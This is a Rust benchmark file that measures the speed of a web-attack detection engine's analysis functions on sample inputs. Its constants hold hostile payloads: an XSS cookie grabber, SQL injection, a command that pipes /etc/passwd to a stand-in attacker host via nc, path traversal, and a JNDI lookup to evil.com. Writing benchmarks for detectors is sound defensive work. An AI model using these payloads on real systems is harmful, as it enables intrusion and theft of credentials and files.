use criterion::BenchmarkId;
use criterion::Criterion;
use criterion::criterion_group;
use criterion::criterion_main;
use guard_core_engine::semantic::AttackKeywords;
use guard_core_engine::semantic::AttackStructures;
use guard_core_engine::semantic::analyze;
use guard_core_engine::semantic::analyze_attack_probability;
use guard_core_engine::semantic::analyze_code_injection_risk;
use guard_core_engine::semantic::calculate_entropy;
use guard_core_engine::semantic::detect_encoding_layers;
use guard_core_engine::semantic::detect_obfuscation;
use guard_core_engine::semantic::extract_suspicious_patterns;
use guard_core_engine::semantic::extract_tokens;
use guard_core_engine::semantic::get_threat_score;

const CLEAN: &str = "GET /api/v1/users?page=1&limit=20 HTTP/1.1";
const XSS: &str = "<img src=x onerror=alert(document.cookie)>";
const SQLI: &str = "1' OR '1'='1' UNION SELECT username, password FROM users--";
const CMD_INJECTION: &str = "test; cat /etc/passwd | nc attacker.com 9999";
const PATH_TRAVERSAL: &str = "../../../../../../etc/passwd";
const TEMPLATE_INJECTION: &str = "{{7*7}} ${jndi:ldap://evil.com/a} {%if%}evil{%endif%}";
const OBFUSCATED: &str = "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";

fn large_mixed() -> String {
    format!(
        "{}<script>eval('alert(1)')</script> UNION SELECT * FROM users{}",
        "normal text ".repeat(1000),
        " more text".repeat(1000)
    )
}

fn bench_extract_tokens(c: &mut Criterion) {
    let structures = AttackStructures::default();

    let payloads: Vec<(&str, String)> = vec![
        ("clean", CLEAN.to_owned()),
        ("xss", XSS.to_owned()),
        ("sqli", SQLI.to_owned()),
        ("large_mixed", large_mixed()),
    ];

    let mut group = c.benchmark_group("extract_tokens");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("tokens", name), payload, |b, p| {
            b.iter(|| extract_tokens(p, &structures));
        });
    }

    group.finish();
}

fn bench_entropy(c: &mut Criterion) {
    let payloads: Vec<(&str, String)> = vec![
        ("clean", CLEAN.to_owned()),
        ("obfuscated", OBFUSCATED.to_owned()),
        ("large", "abcdefghij".repeat(2000)),
    ];

    let mut group = c.benchmark_group("entropy");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("entropy", name), payload, |b, p| {
            b.iter(|| calculate_entropy(p));
        });
    }

    group.finish();
}

fn bench_encoding_layers(c: &mut Criterion) {
    let payloads: Vec<(&str, &str)> = vec![
        ("clean", CLEAN),
        ("url_encoded", "%3Cscript%3E%20alert%281%29%3C%2Fscript%3E"),
        ("multi_layer", "%3C &lt; \\u003C 0x3C3C AAAA=="),
    ];

    let mut group = c.benchmark_group("encoding_layers");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("layers", name), payload, |b, p| {
            b.iter(|| detect_encoding_layers(p));
        });
    }

    group.finish();
}

fn bench_attack_probability(c: &mut Criterion) {
    let keywords = AttackKeywords::default();
    let structures = AttackStructures::default();

    let payloads: Vec<(&str, &str)> = vec![
        ("clean", CLEAN),
        ("xss", XSS),
        ("sqli", SQLI),
        ("cmd", CMD_INJECTION),
        ("path", PATH_TRAVERSAL),
    ];

    let mut group = c.benchmark_group("attack_probability");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("probability", name), payload, |b, p| {
            b.iter(|| analyze_attack_probability(p, &keywords, &structures));
        });
    }

    group.finish();
}

fn bench_obfuscation(c: &mut Criterion) {
    let payloads: Vec<(&str, String)> = vec![
        ("clean", CLEAN.to_owned()),
        ("obfuscated_b64", OBFUSCATED.to_owned()),
        (
            "special_chars",
            "!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`".repeat(3),
        ),
        ("long_run", "a".repeat(150)),
    ];

    let mut group = c.benchmark_group("obfuscation");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("detect", name), payload, |b, p| {
            b.iter(|| detect_obfuscation(p));
        });
    }

    group.finish();
}

fn bench_suspicious_patterns(c: &mut Criterion) {
    let structures = AttackStructures::default();

    let payloads: Vec<(&str, &str)> = vec![
        ("clean", CLEAN),
        ("xss", "<script>alert(1)</script> text with function() call"),
        ("template", TEMPLATE_INJECTION),
    ];

    let mut group = c.benchmark_group("suspicious_patterns");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("patterns", name), payload, |b, p| {
            b.iter(|| extract_suspicious_patterns(p, &structures));
        });
    }

    group.finish();
}

fn bench_code_injection_risk(c: &mut Criterion) {
    let payloads: Vec<(&str, &str)> = vec![
        ("clean", CLEAN),
        ("eval_exec", "eval(user_input) and exec(command)"),
        ("brackets", "{malicious} code {injection}"),
    ];

    let mut group = c.benchmark_group("code_injection_risk");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("risk", name), payload, |b, p| {
            b.iter(|| analyze_code_injection_risk(p));
        });
    }

    group.finish();
}

fn bench_full_analyze(c: &mut Criterion) {
    let keywords = AttackKeywords::default();
    let structures = AttackStructures::default();

    let payloads: Vec<(&str, String)> = vec![
        ("clean", CLEAN.to_owned()),
        ("xss", XSS.to_owned()),
        ("sqli", SQLI.to_owned()),
        ("cmd_injection", CMD_INJECTION.to_owned()),
        ("path_traversal", PATH_TRAVERSAL.to_owned()),
        ("template", TEMPLATE_INJECTION.to_owned()),
        ("obfuscated", OBFUSCATED.to_owned()),
        ("large_mixed", large_mixed()),
    ];

    let mut group = c.benchmark_group("full_analyze");

    for (name, payload) in &payloads {
        group.bench_with_input(BenchmarkId::new("analyze", name), payload, |b, p| {
            b.iter(|| {
                let result = analyze(p, &keywords, &structures);
                get_threat_score(&result)
            });
        });
    }

    group.finish();
}

criterion_group!(
    benches,
    bench_extract_tokens,
    bench_entropy,
    bench_encoding_layers,
    bench_attack_probability,
    bench_obfuscation,
    bench_suspicious_patterns,
    bench_code_injection_risk,
    bench_full_analyze,
);
criterion_main!(benches);
